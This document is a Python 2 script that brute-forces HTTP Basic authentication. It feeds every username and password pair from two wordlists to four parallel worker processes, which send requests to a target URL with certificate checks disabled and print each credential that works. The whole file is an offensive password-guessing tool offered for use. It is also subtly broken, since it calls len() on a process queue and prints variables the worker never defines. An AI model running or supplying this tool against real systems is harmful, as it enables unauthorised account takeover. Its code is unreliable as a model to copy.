import requests
import multiprocessing
import sys
import time
import Queue


def worker(url, cred_queue, success_queue):
    while True:
        # If there are no creds in the queue, stop the thread
        try:
            creds = cred_queue.get(timeout=10)
        except Queue.Empty:
            return

        # If we have good creds then stop the thread
        if len(success_queue) > 0:
            return

        # Check a set of creds. If successful add them to the success_queue
        # and stop the thread.
        auth = requests.auth.HTTPBasicAuth(creds[0], creds[1])
        resp = requests.get(url, auth=auth, verify=False)
        if resp.status_code == 200:
            print '[+] Success: {0}/{1}'.format(user, pwd)
            success_queue.put(creds)
            return
        else:
            print '[-] Failure: {0}/{1}'.format(user, pwd)

        time.sleep(.5)


if __name__ == '__main__':
    if len(sys.argv) != 4:
        print 'USAGE: brute_http_basic.py url userfile passfile'
        sys.exit()

    cred_queue = multiprocessing.Queue()
    success_queue = multiprocessing.Queue()
    procs = []

    for i in range(4):
        p = multiprocessing.Process(target=worker, args=(sys.argv[1],
                                                         cred_queue,
                                                         success_queue))
        procs.append(p)
        p.start()

    for user in open(sys.argv[2]):
        for pwd in open(sys.argv[3]):
            cred_queue.put((user.rstrip('\r\n'), pwd.rstrip('\r\n')))

    # Wait for all worker processes to finish
    for p in procs:
        p.join()

    print success_queue
